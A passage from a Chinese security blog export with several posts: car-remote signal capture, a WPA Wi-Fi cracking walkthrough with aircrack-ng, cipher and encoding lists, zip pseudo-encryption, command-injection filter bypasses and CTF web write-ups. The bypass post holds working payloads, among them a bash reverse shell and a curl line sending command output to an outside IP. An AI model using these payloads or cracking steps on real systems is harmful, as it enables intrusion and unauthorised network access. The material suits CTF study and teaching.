<h2 id="SDR的配置"><a href="#SDR的配置" class="headerlink" title="SDR的配置"></a>SDR的配置</h2><p>我是在Windows平台下进行的这次实验，首先要安装驱动才能使用。这里我使用Zadig 来安装驱动。</p>
<p>打开Zadig，<code>Options</code>下拉选择<code>List All Devices</code>，然后在下拉列表选择<code>RTL2832U</code>，对应我的设备。箭头右边WinUSB不用改。点击<code>install Driver</code>进行安装，很快就会弹窗提示安装成功。</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/%E8%BD%A6%E9%92%A5%E5%8C%99%E5%88%86%E6%9E%90/1.png"></p>
<h2 id="SDR软件"><a href="#SDR软件" class="headerlink" title="SDR软件"></a>SDR软件</h2><p>使用的是HDSDR和URH。</p>
<p>打开之后不能用因为没有设置我的电视棒的输入。下载<code>ExtIO_RTL2832.dll</code>文件，放到HDSDR安装目录下。启动软件就识别到了</p>
<h2 id="分析对象"><a href="#分析对象" class="headerlink" title="分析对象"></a>分析对象</h2><p>从家里翻出来了好久不用的电动车遥控器，拆开来看能看到芯片型号。去网上搜一下找到了<a href="http://datasheetcafe.databank.netdna-cdn.com/wp-content/uploads/2016/11/HS2260A-R4.pdf">芯片的参数文档</a>。</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/%E8%BD%A6%E9%92%A5%E5%8C%99%E5%88%86%E6%9E%90/6.jpg"></p>
<p>这里浪费了很久的时间，刚开始通过HDSDR能大致确定频率在315MHz附近，但录制出来的信号分析时发现虽然能看到有明显起伏的波段，但杂乱无章而且无法解码。倒腾了一下午没解决。结果竟然是长时间不用没大有电了，晚上换上电池一次成功。。</p>
<p>先用HDSDR观察确定大致的频率，在<code>314.440</code>附近。</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/%E8%BD%A6%E9%92%A5%E5%8C%99%E5%88%86%E6%9E%90/4.png"></p>
<p>因为HDSDR效果不是很明显，直接尝试使用URH(Universal Radio Hacker)进行录制和解码。</p>
<p>锁车，解锁，响铃三个键各按了两次。</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/%E8%BD%A6%E9%92%A5%E5%8C%99%E5%88%86%E6%9E%90/5.png"></p>
<p>对比三个按键的数据可以发现，每次发送的数据的前68位都是重复的，锁车和解锁的前84位重复。</p>
<pre><code>锁车：1110111011101110111011101000100010001000111011101000111010001110100010001000100010001000111011101
解锁：
1110111011101110111011101000100010001000111011101000111010001110100010001000100011101110100010001
警报：
1110111011101110111011101000100010001000111011101000111010001110111011101000100010001000100010001</code></pre>
<p>可以这么认为：后32位是功能码：</p>
<p>锁车：<code>100010001000100010001000111011101</code></p>
<p>解锁：<code>100010001000100011101110100010001</code></p>
<p>警报：<code>111011101000100010001000100010001</code></p>
<p>比较简单，可以比较容易的实施重放。但是手里只有电视棒所以不能进行了。</p>
]]></content>
      <categories>
        <category>other</category>
      </categories>
      <tags>
        <tag>无线电</tag>
      </tags>
  </entry>
  <entry>
    <title>使用aircrack-ng爆破WI-FI密码（MAC）</title>
    <url>/2018/03/08/shi-yong-aircrack-ng-bao-po-wi-fi-mi-ma-mac/</url>
    <content><![CDATA[<h1 id="使用aircrack-ng爆破WI-FI密码（MAC）"><a href="#使用aircrack-ng爆破WI-FI密码（MAC）" class="headerlink" title="使用aircrack-ng爆破WI-FI密码（MAC）"></a>使用aircrack-ng爆破WI-FI密码（MAC）</h1><h2 id="0X01-使用Airport获取附近"><a href="#0X01-使用Airport获取附近" class="headerlink" title="0X01 使用Airport获取附近"></a>0X01 使用Airport获取附近</h2><p>macos自带airport，将命令加入环境变量。</p>
<pre><code class="shell">sudo ln -s /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport /usr/local/bin/airport
</code></pre>
<p>查看Wi-Fi信息：</p>
<pre><code class="shell">sudo airport -s</code></pre>
<p>获取到如下信息：</p>
<pre><code> ~ sudo airport -s
SSID             BSSID             RSSI CHANNEL HT CC SECURITY (auth/unicast/group)
TP-LINK_5G_9BC6 f4:83:cd:35:9b:c8 -61  157     Y  CN WPA(PSK/AES/AES) WPA2(PSK/AES/AES)
TP-LINK_0536     b0:95:8e:37:05:36 -71  1,+1    Y  CN WPA(PSK/AES/AES) WPA2(PSK/AES/AES)
iPhone 8p         ee:2d:b7:a8:96:4f -89  11      Y  CN WPA2(PSK/AES/AES)
JDPAI             c8:3a:35:13:5f:90 -87  11,-1   Y  -- WPA(PSK/AES/AES)
最美的人才能连上   cc:2d:83:2d:eb:15 -68  6       Y  -- WPA(PSK/AES,TKIP/TKIP)
LuoNaKaFei         f4:83:cd:35:9b:c6 -49  6,-1    Y  CN WPA(PSK/AES/AES) WPA2(PSK/AES/AES)
汇通快递          d4:ee:07:5d:e1:54 -61  6       Y  CN WPA(PSK/AES/AES) WPA2(PSK/AES/AES)</code></pre>
<h2 id="0X02-监听信道"><a href="#0X02-监听信道" class="headerlink" title="0X02 监听信道"></a>0X02 监听信道</h2><p>看一下自己网卡名字，和要破解Wi-Fi的信道。</p>
<pre><code class="shell">sudo airport en0 sniff 6</code></pre>
<p>监听一会后中止进程就行了，会将数据包保存在/tmp/目录下。</p>
<h2 id="0X03-字典"><a href="#0X03-字典" class="headerlink" title="0X03 字典"></a>0X03 字典</h2><p>使用crunch来生成字典,因为Wi-Fi密码至少8位，我们尝试8-10位的数字。</p>
<pre><code class="shell">crunch 8 10 1234567890  -o dic.txt</code></pre>
<h2 id="0X04-使用aircrack-ng爆破"><a href="#0X04-使用aircrack-ng爆破" class="headerlink" title="0X04 使用aircrack-ng爆破"></a>0X04 使用<a href="https://www.aircrack-ng.org/doku.php?id=cracking_wpa">aircrack-ng</a>爆破</h2><pre><code class="shell">aircrack-ng -w /Users/lanvnal/Desktop/dic.txt -M 100 -f 80 -1 -a 2 -b f4:83:cd:35:9b:c6 /tmp/airportSniff9LQgxO.cap</code></pre>
<p>参数:</p>
<pre><code class="txt">    - -w 指定字典文件
    - -M 指定最大IVs，根据提示可以适当调大次参数
    - -f 暴力破解因子，默认2，也可适当调大
    - -a 加密类型，1:WEP, 2:WPA-PSK
    - -b BSSID，刚刚纪录目标Wi-Fi的Mac地址</code></pre>
]]></content>
      <categories>
        <category>other</category>
      </categories>
      <tags>
        <tag>aircrack</tag>
      </tags>
  </entry>
  <entry>
    <title>各种加密</title>
    <url>/2017/02/08/ge-chong-jia-mi/</url>
    <content><![CDATA[<p><strong><a href="http://www.tuicool.com/articles/2E3INnm">各种加密</a></strong></p>
<p>栅栏密码(Rail-fence Cipher)<br>曲路密码(Curve Cipher)<br>列移位密码(Columnar Transposition Cipher)<br>替换加密:</p>
<a id="more"></a>

<p>埃特巴什码(Atbash Cipher)<br>凯撒密码(Caesar Cipher)<br>ROT5/13/18/47<br>简单换位密码(Simple Substitution Cipher)<br>希尔密码(Hill Cipher)<br>猪圈密码(Pigpen Cipher)<br>波利比奥斯方阵密码（Polybius Square Cipher)<br>夏多密码(曲折加密)<br>普莱菲尔密码(Playfair Cipher)<br>维吉尼亚密码(Vigenère Cipher)<br>自动密钥密码(Autokey Cipher)</p>
<p>博福特密码(Beaufort Cipher)</p>
<p>滚动密钥密码(Running Key Cipher)<br>Porta密码(Porta Cipher)<br>同音替换密码(Homophonic Substitution Cipher)<br>仿射密码(Affine Cipher)<br>培根密码(Baconian Cipher)<br>ADFGX和ADFGVX密码(ADFG/VX Cipher)<br>双密码(Bifid Cipher)</p>
<!--more-->

<p>三分密码(Trifid Cipher)<br>四方密码(Four-Square Cipher)<br>棋盘密码（Checkerboard Cipher)<br>跨棋盘密码(Straddle Checkerboard Cipher)<br>分组摩尔斯替换密码(Fractionated Morse Cipher)<br>Bazeries密码(Bazeries Cipher)<br>Digrafid密码(Digrafid Cipher)<br>格朗普雷密码(Grandpré Cipher)<br>比尔密码(Beale ciphers)<br>键盘密码(Keyboard Cipher)<br>其他有趣的机械密码:</p>
<p>恩尼格玛密码<br>代码混淆加密:</p>
<p>asp混淆加密<br>php混淆加密<br>css/js混淆加密<br>VBScript.Encode混淆加密<br>ppencode<br>rrencode<br>jjencode/aaencode<br>JSfuck<br>jother<br>brainfuck编程语言</p>
]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>加解密</tag>
      </tags>
  </entry>
  <entry>
    <title>关于zip伪加密</title>
    <url>/2017/04/14/guan-yu-zip-wei-jia-mi/</url>
    <content><![CDATA[<h1 id="关于zip伪加密"><a href="#关于zip伪加密" class="headerlink" title="关于zip伪加密"></a>关于zip伪加密</h1><p>​    通过修改zip的16进制文件中加密标志位，达到查看文件要求输入密码但并没有设置密码，即伪加密（并没有真的对其加密）的目的，这里就整理分析一下zip文件的结构，和解决zip伪加密问题的下手部位。</p>
<ul>
<li><h3 id="zip文件的组成"><a href="#zip文件的组成" class="headerlink" title="zip文件的组成"></a>zip文件的组成</h3><p>zip文件由3部分组成，分别是压缩源文件数据区，压缩源文件目录区，压缩源文件目录结束标志。</p>
<ul>
<li><p>压缩源文件数据区</p>
<p>用于记录文件的文件头结构，文件数据和数据描述符。</p>
<p>怎么找这个区呢？winhex打开后可以去找文件头标记，很容易找到。</p>
<p>50 4B 03 04 —-压缩源文件数据区的文件头标志</p>
<p>14 00            —-解压所需pkware版本</p>
<p>00 08          —-全局方式位标记</p>
<p>…………这里不一一分析了，关键的在压缩源文件目录区</p>
</li>
<li><p>压缩源文件目录区</p>
<p>50 4B 01 02 —-目录中文件文件头标记</p>
<p>3F 00            —-压缩所使用的pkware版本</p>
<p>14 00            —-解压所需pkware版本</p>
<p>00 01            —-全局方式位标记（伪加密的关键所在，末位改为奇数，就进行了伪加密）</p>
<p>08 08            —-压缩方式</p>
<p>00 58            —-最后修改文件时间</p>
</li>
<li><p>压缩源文件目录结束标志</p>
<p>50 4B 05 06 —-目录结束标记</p>
<p>00 00            —-当前磁盘编号</p>
<p>00 00            —-目录区磁盘编号</p>
<p>01 00            —-本磁盘上记录总数</p>
<p>………………</p>
<p>​</p>
<p>​    下面是一个伪加密过的zip文件的winhex打开。上面分析的就是这个数据。将框内00 01改为00 00就可以正常打开了。</p>
</li>
</ul>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170415/002604084.png" alt="mark"></p>
<blockquote>
<p><a href="https://zh.wikipedia.org/wiki/ZIP%E6%A0%BC%E5%BC%8F">ZIP</a>是PKWARE公司开发的一种压缩格式，以这种ZIP格式压缩的文件称为ZIP文件。</p>
<p><a href="http://blog.csdn.net/wclxyn/article/details/7288994">组成详解</a></p>
</blockquote>
</li>
</ul>
]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>加解密</tag>
      </tags>
  </entry>
  <entry>
    <title>各种编码整理</title>
    <url>/2017/02/08/ge-chong-bian-ma-zheng-li/</url>
    <content><![CDATA[<p>整理一些CTF中常用的编码。</p>
<p><strong>1.ASCII编码</strong><br>     —<a href="http://tool.oschina.net/commons?type=4">ascii码表</a><br>     —<a href="http://www.mokuge.com/tool/asciito16/">在线转换</a>   </p>
<p><strong>2.Base64/32/16编码</strong><br>—<a href="http://www1.tc711.com/tool/BASE64.htm">在线转换（b64）</a><br>—<a href="http://tomeko.net/online_tools/base32.php?lang=en">在线1</a>/<a href="http://emn178.github.io/online-tools/base32_decode.html">在线2</a></p>
<p><strong>3.<a href="http://web.chacuo.net/charsetquotedprintable">Quoted-printable编码</a></strong></p>
<p><strong>4.XXencode编码</strong><br>—<a href="http://www.tuicool.com/articles/Q32eui">XXencode 编码，XX编码介绍、XXencode编码转换原理、算法</a><br>—<a href="http://web.chacuo.net/charsetxxencode/">在线</a></p>
<p><strong>5.UUencode编码</strong></p>
<p>—<a href="http://web.chacuo.net/charsetuuencode">在线解码</a></p>
<a id="more"></a>

<p><strong>6.URL编码</strong></p>
<pre><code>url编码是一种浏览器用来打包表单输入的格式。
    URL编码遵循下列规则： 每对name/value由&amp;；符分开；每对来自表单的name/value由=符分开。如果用户没有输入值给这个name，那么这个name还是出现，只是无值。任何特殊的字符（就是那些不是简单的七位ASCII，如汉字）将以百分符%用十六进制编码，当然也包括象 =,&amp;；，和 % 这些特殊的字符。其实url编码就是一个字符ascii码的十六进制。不过稍微有些变动，需要在前面加上“%”。比如“\”，它的ascii码是92，92的十六进制是5c，所以“\”的url编码就是%5c。那么汉字的url编码呢？很简单，看例子：“胡”的ascii码是-17670，十六进制是BAFA，url编码是“%BA%FA”。</code></pre>
<p>—<a href="http://web.chacuo.net/charseturlencode">在线解码</a></p>
<p><strong>7.Unicode编码</strong><br>—<a href="http://tool.chinaz.com/Tools/Unicode.aspx">在线解码</a></p>
<p><strong>8.Escape/Unescape编码</strong></p>
<pre><code>Escape/Unescape加密解码/编码解码,又叫%u编码，从以往经验看编码字符串出现有&quot;u&quot;，它是unicode编码，那么Escape编码采用是那一种unicode实现形式呢。其实是UTF-16BE模式。这样一来问题非常简单了。 Escape编码/加密,就是字符对应UTF-16 16进制表示方式前面加%u。Unescape解码/解密，就是去掉&quot;%u&quot;后，将16进制字符还原后，由utf-16转码到自己目标字符。如：字符“中”，UTF-16BE是：“6d93”，因此Escape是“%u6d93”，反之也一样！因为目前%字符，常用作URL编码，所以%u这样编码已经逐渐被废弃了！</code></pre>
<p>—<a href="http://web.chacuo.net/charsetescape">在线解码</a></p>
<p><strong>9.HTML实体编码</strong></p>
<pre><code>字符实体是用一个编号写入HTML代码中来代替一个字符，在使用浏览器访问网页时会将这个编号解析还原为字符以供阅读。

这么做的目的主要有两个：
１、解决HTML代码编写中的一些问题。例如需要在网页上显示小于号（&lt;）和大于号（&gt;），由于它们是HTML的预留标签，可能会被误解析。这时就需要将小于号和大于号写成字符实体：
小于号这样写：&amp;lt; 或 &amp;#60;
大于号这样写：&amp;gt; 或 &amp;#62;
前面的写法称为实体名称，后面的写法则是实体编号。ISO-8859-1字符集（西欧语言）中两百多个字符设定了实体名称，而对于其它所有字符都可以用实体编号来代替。
２、网页编码采用了特定语言的编码，却需要显示来自其它语言的字符。例如，网页编码采用了西欧语言ISO-8859-1，却要在网页中显示中文，这时必须将中文字符以实体形式写入HTML代码中。</code></pre>
<p>—<a href="http://www.qqxiuzi.cn/bianma/zifushiti.php">在线解码</a></p>
<p><strong>10.敲击码(Tap code)</strong></p>
<pre><code> tap code —— 两个一位数字编码一个字母</code></pre>
<p><img src="http://img.blog.csdn.net/20170207212255400?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvTEFOVk5BTA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p>
<p><strong>11.莫尔斯电码(Morse Code)</strong><br>—<a href="https://zhidao.baidu.com/question/488726222320627412.html">表</a></p>
]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>note</tag>
        <tag>编码</tag>
      </tags>
  </entry>
  <entry>
    <title>命令执行的绕过技巧</title>
    <url>/2018/04/08/ming-ling-zhi-xing-de-rao-guo-ji-qiao/</url>
    <content><![CDATA[<h2 id="绕过空格过滤"><a href="#绕过空格过滤" class="headerlink" title="绕过空格过滤"></a>绕过空格过滤</h2><h3 id="1-IFS"><a href="#1-IFS" class="headerlink" title="1.${IFS}"></a>1.${IFS}</h3><p>变量$IFS是shell用来进行自动替换的，默认是 space, tab, newline的一个，所以我们可以调用他来充当空格。</p>
<pre><code>echo $IFS
echo &quot;$IFS&quot; |od -b    //直接输出没东西，转换成二进制就可以看到输出（引号引起来说明这个变量不用IFS替换，使用其原始值）</code></pre>
<pre><code>root@test:~# echo &quot;$IFS&quot;|od -b
0000000 040 011 012 012        //空格 tab 换行
0000004</code></pre>
<p>payload：</p>
<pre><code>root@test:/home/test# cat$&#123;IFS&#125;flag
flagaaaaaaaaaa</code></pre>
<pre><code>root@test:/home/test# cat$IFS$1flag    //如果过滤了&#123;&#125;
flagaaaaaaaaaa</code></pre>
<h3 id="2-重定向符"><a href="#2-重定向符" class="headerlink" title="2.重定向符"></a>2.重定向符</h3><blockquote>
<p>文件描述符是与已打开文件或设备相关联的整数，它们保持和已打开文件或设备的关联。最为常见的文件描述符是stdin、stdout和stderr，它们分别是0、1、2，是系统保留的文件描述符，分别对应标准输入、标准输出和标准错误。对于stdin，stdout和stderr重定向一般采用的操作符主要有&lt;、&gt;和&gt;&gt;,在没有指定的具体文件操作符的情况下，缺省是这样的：command &lt; file.txt相当于command 0&lt; file.txt，也就是说默认是将文件重定向到文件描述符0.</p>
</blockquote>
<p>Payload:</p>
<pre><code>root@test:/home/test# cat&lt;flag
flagaaaaaaaaaa</code></pre>
<h2 id="绕过黑名单"><a href="#绕过黑名单" class="headerlink" title="绕过黑名单"></a>绕过黑名单</h2><h3 id="1-拼接"><a href="#1-拼接" class="headerlink" title="1.拼接"></a>1.拼接</h3><p>Payload:</p>
<pre><code>root@test:/home/test# a=c;b=at;c=flag;$a$b $c
flagaaaaaaaaaa</code></pre>
<h3 id="2-利用系统环境变量"><a href="#2-利用系统环境变量" class="headerlink" title="2.利用系统环境变量"></a>2.利用系统环境变量</h3><pre><code>root@test:/home/test# echo $&#123;SHELLOPTS&#125;
braceexpand:emacs:hashall:histexpand:history:interactive-comments:monitor</code></pre>
<p>payload：</p>
<pre><code>root@test:/home/test# $&#123;SHELLOPTS:3:1&#125;$&#123;SHELLOPTS:2:1&#125;$&#123;SHELLOPTS:29:1&#125; flag
flagaaaaaaaaaa</code></pre>
<h3 id="3-base64"><a href="#3-base64" class="headerlink" title="3.base64"></a>3.base64</h3><p>Payload:</p>
<pre><code>root@test:/home/test# `echo &quot;Y2F0IGZsYWc=&quot;|base64 -d`    //反引号
flagaaaaaaaaaa</code></pre>
<p>or</p>
<pre><code>root@test:/home/test# echo &quot;Y2F0IGZsYWc=&quot;|base64 -d|bash    // |连接
flagaaaaaaaaaa</code></pre>
<h3 id="4-单-双引号"><a href="#4-单-双引号" class="headerlink" title="4.单/双引号"></a>4.单/双引号</h3><p>payload：</p>
<pre><code>root@test:/home/test# ca&quot;&quot;t fl&quot;&quot;ag
flagaaaaaaaaaa
root@test:/home/test# ca&quot;&quot;t fl&#39;&#39;ag
flagaaaaaaaaaa
root@test:/home/test# ca&#39;&#39;t fl&#39;&#39;ag
flagaaaaaaaaaa</code></pre>
<h3 id="5-反斜杠"><a href="#5-反斜杠" class="headerlink" title="5.反斜杠\"></a>5.反斜杠\</h3><p>Payload:</p>
<pre><code>root@test:/home/test# ca\t fla\g
flagaaaaaaaaaa</code></pre>
<h2 id="无回显的命令执行"><a href="#无回显的命令执行" class="headerlink" title="无回显的命令执行"></a>无回显的命令执行</h2><h3 id="1-bash反弹shell"><a href="#1-bash反弹shell" class="headerlink" title="1.bash反弹shell"></a>1.bash反弹shell</h3><pre><code>|bash -i &gt;&amp; /dev/tcp/192.168.211.212/8080 0&gt;&amp;1</code></pre>
<h3 id="2-curl"><a href="#2-curl" class="headerlink" title="2.curl"></a>2.curl</h3><pre><code>|curl 192.168.211.212:8080/?a=`ls |head -n 3|tail -n 1`</code></pre>
]]></content>
      <categories>
        <category>websec</category>
      </categories>
      <tags>
        <tag>绕过</tag>
        <tag>命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>整理</title>
    <url>/2017/03/04/zheng-li/</url>
    <content><![CDATA[<h1 id="整理（web）"><a href="#整理（web）" class="headerlink" title="整理（web）"></a>整理（web）</h1><h3 id="0X01（签到题）"><a href="#0X01（签到题）" class="headerlink" title="0X01（签到题）"></a>0X01（签到题）</h3><p><a href="http://chinalover.sinaapp.com/web1/">链接</a></p>
<p>右键看源码，得到flag。</p>
<h3 id="0X02（md5-collision）"><a href="#0X02（md5-collision）" class="headerlink" title="0X02（md5 collision）"></a>0X02（md5 collision）</h3><p><a href="http://115.28.150.176/md5/index.php">链接</a></p>
<p>源码：</p>
<a id="more"></a>

<pre><code>&lt;?php
$md51 = md5(&#39;QNKCDZO&#39;);
$a = @$_GET[&#39;a&#39;];
$md52 = @md5($a);
if(isset($a))&#123;
if ($a != &#39;QNKCDZO&#39; &amp;&amp; $md51 == $md52) &#123;
    echo &quot;nctf&#123;*****************&#125;&quot;;
&#125; else &#123;
    echo &quot;false!!!&quot;;
&#125;&#125;
else&#123;echo &quot;please input a&quot;;&#125;
?&gt;</code></pre>
<p>根据给出的源码的意思，要提交的a不等于QNKCDZO，还要满足<code> $md51 == $md52</code>，这里不是要md5值完全一样，因为比较时用的是松散比较<code>==</code>，QNKCDZO的md5值为<code>0e830400451993494058024219903391</code>,这里因为是==的比较只比较两个操作数的“值”是否相等，而无论类型是否相同。如果比较一个整数和字符串，则字符串会被转换为整数。如果比较两个数字字符串，则作为整数比较。字符串转换为整数时，是从左到右，直到遇到非数字字符为止。也就是说 ‘123abc456’ 会被转换成 123，而不是 123456。另外字符串开始的空格会被忽略，比如 ‘   234abc’ 转换为 234。这里它的md5第二位是e，也就是比较只比较第一个数字0，找一个md5值符合第一位为0，第二位为字母的就行。</p>
<h5 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h5><ol>
<li><p>PHP</p>
</li>
<li><p>松散比较</p>
</li>
</ol>
<h3 id="0X03（签到2）"><a href="#0X03（签到2）" class="headerlink" title="0X03（签到2）"></a>0X03（签到2）</h3><p><a href="http://teamxlc.sinaapp.com/web1/02298884f0724c04293b4d8c0178615e/index.php">链接</a></p>
<p>源码：</p>
<pre><code>&lt;html&gt;
&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot; /&gt;
尚未登录或口令错误&lt;form action=&quot;./index.php&quot; method=&quot;post&quot;&gt;
    &lt;p&gt;输入框：&lt;input type=&quot;password&quot; value=&quot;&quot; name=&quot;text1&quot; maxlength=&quot;10&quot;&gt;&lt;br&gt;
    请输入口令：zhimakaimen
    &lt;input type=&quot;submit&quot; value=&quot;开门&quot;&gt;
&lt;/form&gt;

&lt;/html&gt;</code></pre>
<p>让输入<code>zhimakaimen</code>，注意到<code>maxlength=&quot;10&quot;</code>，所以通不过，F12修改一下就行。</p>
<h3 id="0x04-这题不是WEB"><a href="#0x04-这题不是WEB" class="headerlink" title="0x04(这题不是WEB)"></a>0x04(这题不是WEB)</h3><p><a href="http://chinalover.sinaapp.com/web2/index.html">链接</a></p>
<p>讲真，这题真不是web，把图片保存到本地，记事本打开得到flag，算是隐写。==。</p>
<h3 id="0X05-单身二十年"><a href="#0X05-单身二十年" class="headerlink" title="0X05(单身二十年)"></a>0X05(单身二十年)</h3><p><a href="http://chinalover.sinaapp.com/web8/">链接</a></p>
<p>burp suite拦截发到repeater，查看响应，flag就在里面。</p>
<pre><code>&lt;script&gt;window.location=&quot;./no_key_is_here_forever.php&quot;; &lt;/script&gt;
key is : nctf&#123;yougotit_script_now&#125;</code></pre>
<p>跳转过程地址栏隐约看到了search.php，就怀疑有其他网页，但是一闪而过，所以burp截住看。上面是search那个网页的源码。可以看出直接重定向到<code>no_key_is_here_forever.php</code>了，flag也就在里面。</p>
<blockquote>
<p><em>window.location</em> 对象用于获得当前页面的地址 (URL),并把浏览器重定向到新的页面</p>
</blockquote>
<p>知识点：burp suit使用。</p>
<h3 id="0X06-php-decode"><a href="#0X06-php-decode" class="headerlink" title="0X06(php decode)"></a>0X06(php decode)</h3><p>直接给出的源码：</p>
<pre><code>&lt;?php
function CLsI($ZzvSWE) &#123;

    $ZzvSWE = gzinflate(base64_decode($ZzvSWE));

    for ($i = 0; $i &lt; strlen($ZzvSWE); $i++) &#123;

        $ZzvSWE[$i] = chr(ord($ZzvSWE[$i]) - 1);

    &#125;

    return $ZzvSWE;

&#125;eval(CLsI(&quot;+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA==&quot;));?&gt;</code></pre>
<p>这不是php嘛，不过最后eval()函数用的不对，改成echo才能输出啊。我是直接放虚拟机里面访问得到的。后来知道有在线php代码测试<a href="http://www.135995.com/runcode/php/">这是链接</a>。</p>
<pre><code>eval() 函数可计算某个字符串，并执行其中的的 JavaScript 代码。</code></pre>
<p>知识点：php</p>
<h3 id="0X07-单身一百年也没用"><a href="#0X07-单身一百年也没用" class="headerlink" title="0X07(单身一百年也没用)"></a>0X07(单身一百年也没用)</h3><p><a href="http://chinalover.sinaapp.com/web9/">链接</a></p>
<p>burp截取，发送repeater，查看响应。</p>
<p>知识点：302重定向。</p>
<h3 id="0X08-Download"><a href="#0X08-Download" class="headerlink" title="0X08(Download~!)"></a>0X08(Download~!)</h3><p><a href="http://way.nuptzj.cn/web6/">链接</a></p>
<p>源码:</p>
<pre><code>

&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;
&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
&lt;head&gt;
&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;
&lt;title&gt;Game 19&lt;/title&gt;
&lt;link href=&quot;templatemo_style.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot; /&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;div id=&quot;templatemo_container&quot;&gt;
    &lt;div id=&quot;templatemo_header&quot;&gt;
        &lt;div id=&quot;website_title&quot;&gt;

        &lt;/div&gt;
    &lt;/div&gt; 

    &lt;div id=&quot;templatemo_menu&quot;&gt;
        &lt;ul&gt;
            &lt;li&gt;&lt;a href=&quot;#&quot; class=&quot;current&quot;&gt;Tips&lt;/a&gt;&lt;/li&gt;
            &lt;li&gt;&lt;b&gt;down&lt;/b&gt;&lt;/li&gt;
        &lt;/ul&gt; 
    &lt;/div&gt;  

    &lt;div id=&quot;templatemo_content_wrapper&quot;&gt;

        &lt;div id=&quot;templatemo_content&quot;&gt;

            &lt;div class=&quot;content_title_01&quot;&gt;听会歌吧&lt;/div&gt;
            &lt;div class=&quot;horizontal_divider_01&quot;&gt;&amp;nbsp;&lt;/div&gt;
            &lt;div class=&quot;cleaner&quot;&gt;&amp;nbsp;&lt;/div&gt;

            &lt;p&gt;为了让大家更轻松的比赛，为大家准备了两首歌让大家下载&lt;/p&gt;

            &lt;p&gt;&lt;a href=&quot;download.php?url=eGluZ3hpbmdkaWFuZGVuZy5tcDM=&quot; target=&quot;_blank&quot;&gt;星星点灯&lt;/a&gt;&lt;/p&gt;
            &lt;p&gt;&lt;a href=&quot;download.php?url=YnV4aWFuZ3poYW5nZGEubXAz&quot; target=&quot;_blank&quot;&gt;不想长大&lt;/a&gt;&lt;/p&gt;


             &lt;div class=&quot;cleaner&quot;&gt;&amp;nbsp;&lt;/div&gt;
        &lt;/div&gt;
        &lt;div class=&quot;cleaner&quot;&gt;&amp;nbsp;&lt;/div&gt;
    &lt;/div&gt;

    &lt;div id=&quot;templatemo_footer&quot;&gt;

    &lt;/div&gt;
&lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre>
<p>点那两首歌的链接可以下载，看源码，发现下载链接.</p>
<pre><code>&lt;p&gt;&lt;a href=&quot;download.php?url=eGluZ3hpbmdkaWFuZGVuZy5tcDM=&quot; target=&quot;_blank&quot;&gt;星星点灯&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;download.php?url=YnV4aWFuZ3poYW5nZGEubXAz&quot; target=&quot;_blank&quot;&gt;不想长大&lt;/a&gt;&lt;/p&gt;</code></pre>
<p>这里url=？说明了下载的东西，可以发现是base64加密过的，复制后base64decode验证是base64，但是要改为什么（下载什么）呢？他说了想下什么下什么，把download.php下载下来看看（把download.php经过base64加密后替换掉原来url=后面的字符串）。得到这个</p>
<pre><code>??&lt;?php
error_reporting(0);
include(&quot;hereiskey.php&quot;);
$url=base64_decode($_GET[url]);
if( $url==&quot;hereiskey.php&quot; || $url==&quot;buxiangzhangda.mp3&quot; || $url==&quot;xingxingdiandeng.mp3&quot; || $url==&quot;download.php&quot;)&#123;
    $file_size = filesize($url);
    header ( &quot;Pragma: public&quot; );
    header ( &quot;Cache-Control: must-revalidate, post-check=0, pre-check=0&quot; );
    header ( &quot;Cache-Control: private&quot;, false );
    header ( &quot;Content-Transfer-Encoding: binary&quot; );
    header ( &quot;Content-Type:audio/mpeg MP3&quot;);
    header ( &quot;Content-Length: &quot; . $file_size);
    header ( &quot;Content-Disposition: attachment; filename=&quot;.$url);
    echo(file_get_contents($url));
    exit;
&#125;
else &#123;
    echo &quot;Access Forbidden!&quot;;
&#125;
?&gt;</code></pre>
<p>剩下的一样来就行了。</p>
<h3 id="0X09-MYSQL"><a href="#0X09-MYSQL" class="headerlink" title="0X09(MYSQL)"></a>0X09(MYSQL)</h3><p><a href="http://chinalover.sinaapp.com/web11/">链接</a></p>
<p>根据提示查看robots.txt，如下：</p>
<pre><code>别太开心，flag不在这，这个文件的用途你看完了？
在CTF比赛中，这个文件往往存放着提示信息

TIP:sql.php

&lt;?php
if($_GET[id]) &#123;
   mysql_connect(SAE_MYSQL_HOST_M . &#39;:&#39; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
  mysql_select_db(SAE_MYSQL_DB);
  $id = intval($_GET[id]);
  $query = @mysql_fetch_array(mysql_query(&quot;select content from ctf2 where id=&#39;$id&#39;&quot;));
  if ($_GET[id]==1024) &#123;
      echo &quot;&lt;p&gt;no! try again&lt;/p&gt;&quot;;
  &#125;
  else&#123;
    echo($query[content]);
  &#125;
&#125;
?&gt;</code></pre>
<p>根据提示需要访问sql.php，同时需要提供参数id。这里关键是intval()函数。intval()将变量转成整数类型。而且id！=1024，所以1024.1就可以了。</p>
